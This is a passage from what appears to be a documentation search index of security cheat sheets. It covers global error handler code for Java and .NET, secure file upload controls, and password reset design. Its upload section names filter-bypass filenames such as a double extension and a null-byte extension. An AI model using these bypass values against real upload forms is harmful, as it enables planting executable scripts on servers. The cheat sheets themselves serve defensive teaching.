exception = context . Exception ; //Log the exception via the content of the variable named \"exception\" if it is not NULL //... } } } Definition of the handler for the management of the error in order to return a generic response: using Newtonsoft.Json ; using System ; using System.Collections.Generic ; using System.Net ; using System.Net.Http ; using System.Text ; using System.Threading ; using System.Threading.Tasks ; using System.Web.Http ; using System.Web.Http.ExceptionHandling ; namespace MyProject.Security { /// <summary> /// Global handler used to handle any error that occurs at application wide level /// </summary> public class GlobalErrorHandler : ExceptionHandler { /// <summary> /// Method in charge of handle the generic response send in case of error /// </summary> /// <param name=\"context\">Error context</param> public override void Handle ( ExceptionHandlerContext context ) { context . Result = new GenericResult (); } /// <summary> /// Class used to represent the generic response send /// </summary> private class GenericResult : IHttpActionResult { /// <summary> /// Method in charge of creating the generic response /// </summary> /// <param name=\"cancellationToken\">Object to cancel the task</param> /// <returns>A task in charge of sending the generic response</returns> public Task < HttpResponseMessage > ExecuteAsync ( CancellationToken cancellationToken ) { //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response //is an error var responseBody = new Dictionary < String , String >{ { \"message\" , \"An error occur, please retry\" } }; HttpResponseMessage response = new HttpResponseMessage ( HttpStatusCode . OK ); response . Headers . Add ( \"X-ERROR\" , \"true\" ); response . Content = new StringContent ( JsonConvert . SerializeObject ( responseBody ), Encoding . UTF8 , \"application/json\" ); return Task . FromResult ( response ); } } } } Registration of the both handlers in the application WebApiConfig.cs file: using MyProject.Security ; using System.Web.Http ; using System.Web.Http.ExceptionHandling ; namespace MyProject { public static class WebApiConfig { public static void Register ( HttpConfiguration config ) { //Register global error logging and handling handlers in first config . Services . Replace ( typeof ( IExceptionLogger ), new GlobalErrorLogger ()); config . Services . Replace ( typeof ( IExceptionHandler ), new GlobalErrorHandler ()); //Rest of the configuration //... } } } Setting ccustomErrors section to the Web.config file within the csharp <system.web> node as follows. < configuration > ... < system . web > < customErrors mode = \"RemoteOnly\" defaultRedirect = \"~/ErrorPages/Oops.aspx\" /> ... </ system . web > </ configuration > References: Exception handling with ASP.Net Web API ASP.NET Error Handling Sources of the prototype \u00b6 The source code of all the sandbox projects created to find the right setup to use is stored in this GitHub repository .","title":"Error Handling"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#error-handling-cheat-sheet","text":"","title":"Error Handling Cheat Sheet"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#introduction","text":"Error handling is a part of the overall security of an application. Except in movies, an attack always begins with a Reconnaissance phase in which the attacker will try to gather as much technical information (often name and version properties) as possible about the target, such as the application server, frameworks, libraries, etc. Unhandled errors can assist an attacker in this initial phase, which is very important for the rest of the attack. The following link provides a description of the different phases of an attack.","title":"Introduction"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#context","text":"Issues at the error handling level can reveal a lot of information about the target and can also be used to identify injection points in the target's features. Below is an example of the disclosure of a technology stack, here the Struts2 and Tomcat versions, via an exception rendered to the user: HTTP Status 500 - For input string: \"null\" type Exception report message For input string: \"null\" description The server encountered an internal error that prevented it from fulfilling this request. exception java.lang.NumberFormatException: For input string: \"null\" java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:492) java.lang.Integer.parseInt(Integer.java:527) sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) java.lang.reflect.Method.invoke(Method.java:606) com.opensymphony.xwork2.DefaultActionInvocation.invokeAction(DefaultActionInvocation.java:450) com.opensymphony.xwork2.DefaultActionInvocation.invokeActionOnly(DefaultActionInvocation.java:289) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:252) org.apache.struts2.interceptor.debugging.DebuggingInterceptor.intercept(DebuggingInterceptor.java:256) com.opensymphony.xwork2.DefaultActionInvocation.invoke(DefaultActionInvocation.java:246) ... note: The full stack trace of the root cause is available in the Apache Tomcat/7.0.56 logs. Below is an example of disclosure of a SQL query error, along with the site installation path, that can be used to identify an injection point: Warning: odbc_fetch_array() expects parameter /1 to be resource, boolean given in D:\\app\\index_new.php on line 188 The OWASP Testing Guide provides different techniques to obtain technical information from an application.","title":"Context"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#objective","text":"The article shows how to configure a global error handler at the configuration level when possible, otherwise at code level, in different technologies, in order to ensure that if an unexpected error occurs then a generic response is returned by the application but the error is traced on server side for investigation. The following schema shows the target approach: As most recent application topologies are API based , we assume in this article that the backend exposes only a REST API and does not contain any user interface content. For the error logging operation itself, the logging cheat sheet should be used. This article focuses on the error handling part.","title":"Objective"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#proposition","text":"For each technology, a setup will be proposed with configuration and code snippet.","title":"Proposition"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#java-classic-web-application","text":"For this kind of application, a global error handler can be configured at the web.xml deployment descriptor level. We propose here a configuration that can be used from Servlet specification version 2.5 and above. With this configuration, any unexpected error will cause a redirection to the page error.jsp in which the error will be traced and a generic response will be returned. Configuration of the redirection into the web.xml file: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" ns= \"http://java.sun.com/xml/ns/javaee\" xsi:schemaLocation= \"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\" version= \"3.0\" > ... <error-page> <exception-type> java.lang.Exception </exception-type> <location> /error.jsp </location> </error-page> ... </web-app> Content of the error.jsp file: <% @ page language = \"java\" isErrorPage = \"true\" contentType = \"application/json; charset=UTF-8\" pageEncoding = \"UTF-8\" %> <% String errorMessage = exception . getMessage (); //Log the exception via the content of the implicit variable named \"exception\" //... //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response is an error response . setHeader ( \"X-ERROR\" , \"true\" ); response . setStatus ( 200 ); %> { \"message\" : \"An error occur, please retry\" }","title":"Java classic web application"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#java-springmvcspringboot-web-application","text":"With SpringMVC or SpringBoot , you can define a global error handler by simply implementing the following kind of class in your project. We indicate to the handler, via the annotation @ExceptionHandler , to act when any exception extending the class java.lang.Exception is thrown by the application. import net.minidev.json.JSONObject ; import org.springframework.http.HttpHeaders ; import org.springframework.http.HttpStatus ; import org.springframework.http.MediaType ; import org.springframework.http.ResponseEntity ; import org.springframework.web.bind.annotation.ControllerAdvice ; import org.springframework.web.bind.annotation.ExceptionHandler ; import org.springframework.web.context.request.WebRequest ; /** * Global error handler in charge of returning a generic response in case of unexpected error situation. */ @ControllerAdvice public class RestResponseEntityExceptionHandler { @ExceptionHandler ( value = { Exception . class }) public ResponseEntity < Object > handleGlobalError ( RuntimeException exception , WebRequest request ) { //Log the exception via the content of the parameter named \"exception\" //... //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response is an error HttpHeaders responseHeaders = new HttpHeaders (); responseHeaders . setContentType ( MediaType . APPLICATION_JSON ); responseHeaders . set ( \"X-ERROR\" , \"true\" ); JSONObject responseBody = new JSONObject (); responseBody . put ( \"message\" , \"An error occur, please retry\" ); ResponseEntity < JSONObject > response = new ResponseEntity <> ( responseBody , responseHeaders , HttpStatus . OK ); return ( ResponseEntity ) response ; } } References: Exception handling with Spring Exception handling with SpringBoot","title":"Java SpringMVC/SpringBoot web application"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#asp-net-core-web-application","text":"With ASP.NET Core , you can define a global error handler by indicating that the exception handler is a dedicated API Controller. Content of the API Controller dedicated to the error handling: using Microsoft.AspNetCore.Authorization ; using Microsoft.AspNetCore.Diagnostics ; using Microsoft.AspNetCore.Mvc ; using System ; using System.Collections.Generic ; using System.Net ; namespace MyProject.Controllers { /// <summary> /// API Controller used to intercept and handle all unexpected exception /// </summary> [Route(\"api/[controller] \")] [ApiController] [AllowAnonymous] public class ErrorController : ControllerBase { /// <summary> /// Action that will be invoked for any call to this Controller in order to handle the current error /// </summary> /// <returns>A generic error formatted as JSON because we are in a REST API app context</returns> [HttpGet] [HttpPost] [HttpHead] [HttpDelete] [HttpPut] [HttpOptions] [HttpPatch] public JsonResult Handle () { //Get the exception that has implied the call to this controller Exception exception = HttpContext . Features . Get < IExceptionHandlerFeature >()?. Error ; //Log the exception via the content of the variable named \"exception\" if it is not NULL //... //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response //is an error var responseBody = new Dictionary < String , String >{ { \"message\" , \"An error occur, please retry\" } }; JsonResult response = new JsonResult ( responseBody ); response . StatusCode = ( int ) HttpStatusCode . OK ; Request . HttpContext . Response . Headers . Remove ( \"X-ERROR\" ); Request . HttpContext . Response . Headers . Add ( \"X-ERROR\" , \"true\" ); return response ; } } } Definition in the application Startup.cs file of the mapping of the exception handler to the dedicated error handling API controller: using Microsoft.AspNetCore.Builder ; using Microsoft.AspNetCore.Hosting ; using Microsoft.AspNetCore.Mvc ; using Microsoft.Extensions.Configuration ; using Microsoft.Extensions.DependencyInjection ; namespace MyProject { public class Startup { ... public void Configure ( IApplicationBuilder app , IHostingEnvironment env ) { //First we configure the error handler middleware! //We enable the global error handler in others environments than DEV //because debug page are useful during implementation if ( env . IsDevelopment ()) { app . UseDeveloperExceptionPage (); } else { //Our global handler is defined on \"/api/error\" URL so we indicate to the //exception handler to call this API controller //on any unexpected exception raised by the application app . UseExceptionHandler ( \"/api/error\" ); //To customize the response content type and text, use the overload of //UseStatusCodePages that takes a content type and format string. app . UseStatusCodePages ( \"text/plain\" , \"Status code page, status code: {0}\" ); } //We configure others middlewares, remember that the declaration order is important... app . UseMvc (); //... } } } References: Exception handling with ASP.Net Core","title":"ASP NET Core web application"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#asp-net-web-api-web-application","text":"With ASP.NET Web API (from the standard .NET framework and not from the .NET Core framework), you can define and register handlers in order to trace and handle any error that occurs in the application. Definition of the handler for the tracing of the error details: using System ; using System.Web.Http.ExceptionHandling ; namespace MyProject.Security { /// <summary> /// Global logger used to trace any error that occurs at application wide level /// </summary> public class GlobalErrorLogger : ExceptionLogger { /// <summary> /// Method in charge of the management of the error from a tracing point of view /// </summary> /// <param name=\"context\">Context containing the error details</param> public override void Log ( ExceptionLoggerContext context ) { //Get the exception Exception exception = context . Exception ; //Log the exception via the content of the variable named \"exception\" if it is not NULL //... } } } Definition of the handler for the management of the error in order to return a generic response: using Newtonsoft.Json ; using System ; using System.Collections.Generic ; using System.Net ; using System.Net.Http ; using System.Text ; using System.Threading ; using System.Threading.Tasks ; using System.Web.Http ; using System.Web.Http.ExceptionHandling ; namespace MyProject.Security { /// <summary> /// Global handler used to handle any error that occurs at application wide level /// </summary> public class GlobalErrorHandler : ExceptionHandler { /// <summary> /// Method in charge of handle the generic response send in case of error /// </summary> /// <param name=\"context\">Error context</param> public override void Handle ( ExceptionHandlerContext context ) { context . Result = new GenericResult (); } /// <summary> /// Class used to represent the generic response send /// </summary> private class GenericResult : IHttpActionResult { /// <summary> /// Method in charge of creating the generic response /// </summary> /// <param name=\"cancellationToken\">Object to cancel the task</param> /// <returns>A task in charge of sending the generic response</returns> public Task < HttpResponseMessage > ExecuteAsync ( CancellationToken cancellationToken ) { //We build a generic response with a JSON format because we are in a REST API app context //We also add an HTTP response header to indicate to the client app that the response //is an error var responseBody = new Dictionary < String , String >{ { \"message\" , \"An error occur, please retry\" } }; HttpResponseMessage response = new HttpResponseMessage ( HttpStatusCode . OK ); response . Headers . Add ( \"X-ERROR\" , \"true\" ); response . Content = new StringContent ( JsonConvert . SerializeObject ( responseBody ), Encoding . UTF8 , \"application/json\" ); return Task . FromResult ( response ); } } } } Registration of the both handlers in the application WebApiConfig.cs file: using MyProject.Security ; using System.Web.Http ; using System.Web.Http.ExceptionHandling ; namespace MyProject { public static class WebApiConfig { public static void Register ( HttpConfiguration config ) { //Register global error logging and handling handlers in first config . Services . Replace ( typeof ( IExceptionLogger ), new GlobalErrorLogger ()); config . Services . Replace ( typeof ( IExceptionHandler ), new GlobalErrorHandler ()); //Rest of the configuration //... } } } Setting ccustomErrors section to the Web.config file within the csharp <system.web> node as follows. < configuration > ... < system . web > < customErrors mode = \"RemoteOnly\" defaultRedirect = \"~/ErrorPages/Oops.aspx\" /> ... </ system . web > </ configuration > References: Exception handling with ASP.Net Web API ASP.NET Error Handling","title":"ASP NET Web API web application"},{"location":"cheatsheets/Error_Handling_Cheat_Sheet.html#sources-of-the-prototype","text":"The source code of all the sandbox projects created to find the right setup to use is stored in this GitHub repository .","title":"Sources of the prototype"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html","text":"File Upload Cheat Sheet \u00b6 Introduction \u00b6 File upload is becoming a more and more essential part of any application, where the user is able to upload their photo, their CV, or a video showcasing a project they are working on. The application should be able to fend off bogus and malicious files in a way to keep the application and the users safe. In short, the following principles should be followed to reach a secure file upload implementation: Whitelist allowed extensions. Only allow safe and critical extensions for business functionality Ensure that input validation is applied before validating the extensions. Validate the file type, don't trust the Content-Type header as it can be spoofed Change the filename to something generated by the application Set a filename length limit. Restrict the allowed characters if possible Set a file size limit Only allow authorised users to upload files Store the files on a different server. If that's not possible, store them outside of the webroot In the case of public access to the files, use a handler that gets mapped to filenames inside the application (someid -> file.ext) Run the file through an antivirus or a sandbox if available to validate that it doesn't contain malicious data Ensure that any libraries used are securely configured and kept up to date Protect the file upload from CSRF attacks File Upload Threats \u00b6 In order to assess and know exactly what controls to implement, knowing what you're facing is essential to protect your assets. The following sections will hopefully showcase the risks accompanying the file upload functionality. Malicious Files \u00b6 The attacker delivers a file for malicious intent, such as: Exploit vulnerabilities in the file parser or processing module ( e.g. ImageTrick Exploit , XXE ) Use the file for phishing ( e.g. careers form) Send ZIP bombs, XML bombs (otherwise known as billion laughs attack), or simply huge files in a way to fill the server storage which hinders and damages the server's availability Overwrite an existing file on the system Client-side active content (XSS, CSRF, etc.) that could endanger other users if the files are publicly retrievable. Public File Retrieval \u00b6 If the file uploaded is publicly retrievable, additional threats can be addressed: Public disclosure of other files Initiate a DoS attack by requesting lots of files. Requests are small, yet responses are much larger File content that could be deemed as illegal, offensive, or dangerous ( e.g. personal data, copyrighted data, etc.) which will make you a host for such malicious files. File Upload Protection \u00b6 There is no silver bullet in validating user content. Implementing a defense in depth approach is key to make the upload process harder and more locked down to the needs and requirements for the service. Implementing multiple techniques is key and recommended, as no one technique is enough to secure the service. Extension Validation \u00b6 Ensure that the validation occurs after decoding the file name, and that a proper filter is set in place in order to avoid certain known bypasses, such as the following: Double extensions, e.g. .jpg.php , where it circumvents easily the regex \\.jpg Null bytes, e.g. .php%00.jpg , where .jpg gets truncated and .php becomes the new extension Generic bad regex that isn't properly tested and well reviewed. Refrain from building your own logic unless you have enough knowledge on this topic. Refer to the Input Validation CS to properly parse and process the extension. Whitelist Extensions \u00b6 Ensure the usage of business-critical extensions only, without allowing any type of non-required extensions. For example if the system requires: image upload, allow one type that is agreed upon to fit the business requirement; cv upload, allow docx and pdf extensions. Based on the needs of the application, ensure the least harmful and the lowest risk file types to be used. Blacklist Extensions \u00b6 Blacklisting extensions is a bad idea and is very dangerous. Don't do it unless you have no other choice! In order to perform this validation, specifying and identifying which patterns that could should be rejected are used in order to protect the service. Content-Type Validation \u00b6 The Content-Type for uploaded files is provided by the user, and as such cannot be trusted, as it is trivial to spoof. Although it should not be relied upon for security, it provides a quick check to prevent users from unintentionally uploading files with the incorrect type. Other than defining the extension of the uploaded file, its MIME-type can be checked for a quick protection against simple file upload attacks. This can be done preferrably in a whitelist approach; otherwise, this can be done in a blacklist approach. File Signature Validation \u00b6 In conjunction with content-type validation , validating the file's signature can be checked and verified against the expected file that should be received. This should not be used on its own, as bypassing it is pretty common and easy. Filename Sanitization \u00b6 Filenames can endager the system in multiple ways, either by using non acceptable characters, or by using special and restricted filenames. For Windows, refer to the following MSDN guide . For a wider overview on different filesystems and how they treat files, refer to Wikipedia's Filename page . In order to avoid the above mentioned threat, creating a random string as a file-name, such as generating a UUID/GUID, is essential. If the filename is required by the business needs, proper input validation should be done for client-side ( e.g. active content that results in XSS and CSRF attacks) and back-end side ( e.g. special files overwrite or creation) attack vectors. Filename length limits should be taken into consideration based on the system storing the files, as each system has its own filename length limit. If user filenames are required, consider implementing the following: Implement a maximum length Restrict characters to an allowed subset specifically, such as alphanumeric characters, hyphen, spaces, and periods If this is not possible, blacklist dangerous characters that could endanger the framework and system that is storing and using the files. File Content Validation \u00b6 As mentioned in the Public File Retrieval section, file content can contain malicious, inappropriate, or illegal data. Based on the expected type, special file content validation can be applied: For images , applying image rewriting techniques destroys any kind of malicious content injected in an image; this could be done through randomization . For Microsoft documents , the usage of Apache POI helps validating the uploaded documents. ZIP files are not recommended since they can contain all types of files, and the attack vectors pertaining to them are numerous. The File Upload service should allow users to report illegal content, and copyright owners to report abuse. If there are enough resources, manual file review should be conducted in a sandboxed environment before releasing the files to the public. Adding some automation to the review could be helpful, which is a harsh process and should be well studied before its usage. Some services ( e.g. Virus Total) provide APIs to scan files against well known malicious file hashes. Some frameworks can check and validate the raw content type and validating it against predefined file types, such as in ASP.NET Drawing Library . Beware of data leakage threats and information gathering by public services. File Storage Location \u00b6 The location where the files should be stored must be chosen based on security and business requirements. The following points are set by security priority, and are inclusive: Store the files on a different host , which allows for complete segragation of duties between the application serving the user, and the host handling file uploads and their storage. Store the files outside the webroot , where only administrative access is allowed. Store the files inside the webroot , and set them in write permissions only. If read access is required, setting proper controls is a must ( e.g. internal IP, authorized user, etc.) Storing files in a studied manner in databases is one additional technique. This is sometimes used for automatic backup processes, non file-system attacks, and permissions issues. In return, this opens up the door to performance issues (in some cases), storage considerations for the database and its backups, and this opens up the door to SQLi attack. This is advised only when a DBA is on the team and that this process shows to be an improvement on storing them on the file-system. Some files are emailed or processed once they are uploaded, and are not stored on the server. It is essential to conduct the security measures discussed in this sheet before doing any actions on them. User Permissions \u00b6 Before any file upload service is accessed, proper validation should occur on two levels for the user uploading a file: Authentication level The user should be a registered user, or an identifiable user, in order to set restrictions and limitations for their upload capabilities Authorization level The user should have appropriate permissions to access or modify the files Filesystem Permissions \u00b6 Set the files permissions on the principle of least privilege. Files should be stored in a way that ensures: Allowed system users are the only ones capable of reading the files Required modes only are set for the file If execution is required, scanning the file before running it is required as a security best practice, to ensure that no macros or hidden scripts are available. Upload and Download Limits \u00b6 The application should set proper size limits for the upload service in order to protect the file storage capacity. If the system is going to extract the files or process them, the file size limit should be considered after file decompression is conducted and by using secure methods to calculate zip files size. For more on this, see how to Safely extract files from ZipInputStream , Java's input stream to handle ZIP files. The application should set proper request limits as well for the download service if available to protect the server from DoS attacks. Java Code Snippets \u00b6 Document Upload Protection repository written by Dominique for certain document types in Java.","title":"File Upload"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#file-upload-cheat-sheet","text":"","title":"File Upload Cheat Sheet"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#introduction","text":"File upload is becoming a more and more essential part of any application, where the user is able to upload their photo, their CV, or a video showcasing a project they are working on. The application should be able to fend off bogus and malicious files in a way to keep the application and the users safe. In short, the following principles should be followed to reach a secure file upload implementation: Whitelist allowed extensions. Only allow safe and critical extensions for business functionality Ensure that input validation is applied before validating the extensions. Validate the file type, don't trust the Content-Type header as it can be spoofed Change the filename to something generated by the application Set a filename length limit. Restrict the allowed characters if possible Set a file size limit Only allow authorised users to upload files Store the files on a different server. If that's not possible, store them outside of the webroot In the case of public access to the files, use a handler that gets mapped to filenames inside the application (someid -> file.ext) Run the file through an antivirus or a sandbox if available to validate that it doesn't contain malicious data Ensure that any libraries used are securely configured and kept up to date Protect the file upload from CSRF attacks","title":"Introduction"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#file-upload-threats","text":"In order to assess and know exactly what controls to implement, knowing what you're facing is essential to protect your assets. The following sections will hopefully showcase the risks accompanying the file upload functionality.","title":"File Upload Threats"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#malicious-files","text":"The attacker delivers a file for malicious intent, such as: Exploit vulnerabilities in the file parser or processing module ( e.g. ImageTrick Exploit , XXE ) Use the file for phishing ( e.g. careers form) Send ZIP bombs, XML bombs (otherwise known as billion laughs attack), or simply huge files in a way to fill the server storage which hinders and damages the server's availability Overwrite an existing file on the system Client-side active content (XSS, CSRF, etc.) that could endanger other users if the files are publicly retrievable.","title":"Malicious Files"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#public-file-retrieval","text":"If the file uploaded is publicly retrievable, additional threats can be addressed: Public disclosure of other files Initiate a DoS attack by requesting lots of files. Requests are small, yet responses are much larger File content that could be deemed as illegal, offensive, or dangerous ( e.g. personal data, copyrighted data, etc.) which will make you a host for such malicious files.","title":"Public File Retrieval"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#file-upload-protection","text":"There is no silver bullet in validating user content. Implementing a defense in depth approach is key to make the upload process harder and more locked down to the needs and requirements for the service. Implementing multiple techniques is key and recommended, as no one technique is enough to secure the service.","title":"File Upload Protection"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#extension-validation","text":"Ensure that the validation occurs after decoding the file name, and that a proper filter is set in place in order to avoid certain known bypasses, such as the following: Double extensions, e.g. .jpg.php , where it circumvents easily the regex \\.jpg Null bytes, e.g. .php%00.jpg , where .jpg gets truncated and .php becomes the new extension Generic bad regex that isn't properly tested and well reviewed. Refrain from building your own logic unless you have enough knowledge on this topic. Refer to the Input Validation CS to properly parse and process the extension.","title":"Extension Validation"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#whitelist-extensions","text":"Ensure the usage of business-critical extensions only, without allowing any type of non-required extensions. For example if the system requires: image upload, allow one type that is agreed upon to fit the business requirement; cv upload, allow docx and pdf extensions. Based on the needs of the application, ensure the least harmful and the lowest risk file types to be used.","title":"Whitelist Extensions"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#blacklist-extensions","text":"Blacklisting extensions is a bad idea and is very dangerous. Don't do it unless you have no other choice! In order to perform this validation, specifying and identifying which patterns that could should be rejected are used in order to protect the service.","title":"Blacklist Extensions"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#content-type-validation","text":"The Content-Type for uploaded files is provided by the user, and as such cannot be trusted, as it is trivial to spoof. Although it should not be relied upon for security, it provides a quick check to prevent users from unintentionally uploading files with the incorrect type. Other than defining the extension of the uploaded file, its MIME-type can be checked for a quick protection against simple file upload attacks. This can be done preferrably in a whitelist approach; otherwise, this can be done in a blacklist approach.","title":"Content-Type Validation"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#file-signature-validation","text":"In conjunction with content-type validation , validating the file's signature can be checked and verified against the expected file that should be received. This should not be used on its own, as bypassing it is pretty common and easy.","title":"File Signature Validation"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#filename-sanitization","text":"Filenames can endager the system in multiple ways, either by using non acceptable characters, or by using special and restricted filenames. For Windows, refer to the following MSDN guide . For a wider overview on different filesystems and how they treat files, refer to Wikipedia's Filename page . In order to avoid the above mentioned threat, creating a random string as a file-name, such as generating a UUID/GUID, is essential. If the filename is required by the business needs, proper input validation should be done for client-side ( e.g. active content that results in XSS and CSRF attacks) and back-end side ( e.g. special files overwrite or creation) attack vectors. Filename length limits should be taken into consideration based on the system storing the files, as each system has its own filename length limit. If user filenames are required, consider implementing the following: Implement a maximum length Restrict characters to an allowed subset specifically, such as alphanumeric characters, hyphen, spaces, and periods If this is not possible, blacklist dangerous characters that could endanger the framework and system that is storing and using the files.","title":"Filename Sanitization"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#file-content-validation","text":"As mentioned in the Public File Retrieval section, file content can contain malicious, inappropriate, or illegal data. Based on the expected type, special file content validation can be applied: For images , applying image rewriting techniques destroys any kind of malicious content injected in an image; this could be done through randomization . For Microsoft documents , the usage of Apache POI helps validating the uploaded documents. ZIP files are not recommended since they can contain all types of files, and the attack vectors pertaining to them are numerous. The File Upload service should allow users to report illegal content, and copyright owners to report abuse. If there are enough resources, manual file review should be conducted in a sandboxed environment before releasing the files to the public. Adding some automation to the review could be helpful, which is a harsh process and should be well studied before its usage. Some services ( e.g. Virus Total) provide APIs to scan files against well known malicious file hashes. Some frameworks can check and validate the raw content type and validating it against predefined file types, such as in ASP.NET Drawing Library . Beware of data leakage threats and information gathering by public services.","title":"File Content Validation"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#file-storage-location","text":"The location where the files should be stored must be chosen based on security and business requirements. The following points are set by security priority, and are inclusive: Store the files on a different host , which allows for complete segragation of duties between the application serving the user, and the host handling file uploads and their storage. Store the files outside the webroot , where only administrative access is allowed. Store the files inside the webroot , and set them in write permissions only. If read access is required, setting proper controls is a must ( e.g. internal IP, authorized user, etc.) Storing files in a studied manner in databases is one additional technique. This is sometimes used for automatic backup processes, non file-system attacks, and permissions issues. In return, this opens up the door to performance issues (in some cases), storage considerations for the database and its backups, and this opens up the door to SQLi attack. This is advised only when a DBA is on the team and that this process shows to be an improvement on storing them on the file-system. Some files are emailed or processed once they are uploaded, and are not stored on the server. It is essential to conduct the security measures discussed in this sheet before doing any actions on them.","title":"File Storage Location"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#user-permissions","text":"Before any file upload service is accessed, proper validation should occur on two levels for the user uploading a file: Authentication level The user should be a registered user, or an identifiable user, in order to set restrictions and limitations for their upload capabilities Authorization level The user should have appropriate permissions to access or modify the files","title":"User Permissions"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#filesystem-permissions","text":"Set the files permissions on the principle of least privilege. Files should be stored in a way that ensures: Allowed system users are the only ones capable of reading the files Required modes only are set for the file If execution is required, scanning the file before running it is required as a security best practice, to ensure that no macros or hidden scripts are available.","title":"Filesystem Permissions"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#upload-and-download-limits","text":"The application should set proper size limits for the upload service in order to protect the file storage capacity. If the system is going to extract the files or process them, the file size limit should be considered after file decompression is conducted and by using secure methods to calculate zip files size. For more on this, see how to Safely extract files from ZipInputStream , Java's input stream to handle ZIP files. The application should set proper request limits as well for the download service if available to protect the server from DoS attacks.","title":"Upload and Download Limits"},{"location":"cheatsheets/File_Upload_Cheat_Sheet.html#java-code-snippets","text":"Document Upload Protection repository written by Dominique for certain document types in Java.","title":"Java Code Snippets"},{"location":"cheatsheets/Forgot_Password_Cheat_Sheet.html","text":"Forgot Password Cheat Sheet \u00b6 Introduction \u00b6 In order to implement a proper user management system, systems integrate a Forgot Password service that allows the user to request a password reset. Even though this functionality looks straightforward and easy to implement, it is a common source of vulnerabilities, such as the renowned user enumeration attack . The following short guidelines can be used as a quick reference to protect the forgot password service: Return a consistent message for both existent and non-existent accounts. Ensure that the time taken for the user response message is uniform. Use a side-channel to communicate the method to reset their password. Use URL tokens for the simplest and fastest implementation. Ensure that generated tokens or codes are: Randomly genererated using a cryptographically safe algorithm. Sufficiently long to protect against brute-force attacks. Stored securely. Single use and expire after an appropriate period. This cheat sheet is focused on resetting users passwords. For guidance on resetting multifactor authentication (MFA), see the relevant section in the Multifactor Authentication Cheat Sheet . Forgot Password Service \u00b6 The password reset process can be broken into two main steps, detailed in the following sections. Forgot Password Request \u00b6 When a user uses the forgot password service and inputs their username or email, the below should be followed to implement a secure process: Return a consistent message for both existent and non-existent accounts. Ensure that responses return in a consistent amount of time to prevent an attacker enumerating which accounts exist. This could be achieved by using asynchronous calls or by making sure that the same logic is followed, instead of using a quick exit method. Implement protections against automated submissions such as CAPTCHA, rate-limiting or other controls. Employ normal security measures, such as SQL Injection Prevention methods and Input Validation . User Resets Password \u00b6 Once the user has proved their identity by providing the token (sent via an email) or code (sent via SMS or other mechanisms), they should reset their password to a new secure one. In order to secure this step, the measures that should be taken are: The user should confirm the password they set by writing it twice. Ensure that a secure password policy is in place, and is consistent with the rest of the application. Update and store the password following secure practices . Send the user an email informing them that their password has been reset (do not send the password in the email!). Once they have set their new password, the user should then login through the usual mechanism. Don't automatically log the user in, as this introduces additional complexity to the authentication and session handling code, and increases the likelihood of introducing vulnerabilities. Ask the user if they want to invalidate all of their existing sessions, or invalidate the sessions automatically. Methods \u00b6 In order to allow a user to request a password reset, you will need to have some way to identify the user, or a means to reach out to them through a side-channel. This can be done through any of the following methods: URL tokens . PINs Offline methods Security questions . These methods can be used together to provide a greater degree of assurance that the user is who they claim to be. No matter what, you must ensure that a user always has a way to recover their account, even if that involves contacting the support team and proving their identity to staff. General Security Practices \u00b6 It is essential to employ good security practices for the reset identifiers (tokens, codes, PINs, etc.). Some points don't apply to the offline methods , such as the lifetime restriction. All tokens and codes should be: Generated cryptographically secure random number generator . It is also possible to use JSON Web Tokens (JWTs) in place of random tokens, although this can introduce additional vulnerability, such as those discussed in the JSON Web Token Cheat Sheet . Long enough to protect against brute-force attacks. Linked to an individual user in the database. Invalidated after they have been used. Stored in a secure manner, as discussed in the Password Storage Cheat Sheet . URL Tokens \u00b6 URL tokens are passed in the query string of the URL, and are typically sent to the user via email. The basic overview of the process is as follows: Generate a token to the user and attach it in the URL query string. Send this token to the user via email. Don't rely on the Host header while creating the reset URLs to avoid Host Header Injection attacks. The URL should be either be hard-coded, or should be validated against a whitelist of trusted domains. Ensure that the URL is using HTTPS. The user receives the email, and browses to the URL with the attached token. Ensure that the reset password page adds the Referrer Policy tag with the noreferrer value in order to avoid referrer leakage . Implement appropriate protection to prevent users from brute-forcing tokens in the URL, such as rate limiting. If required, perform any additional validation steps such as requiring the user to answer security questions . Let the user create a new password and confirm it. Ensure that the same password policy used elsewhere in the application is applied. Note: URL tokens can follow on the same behavior of the 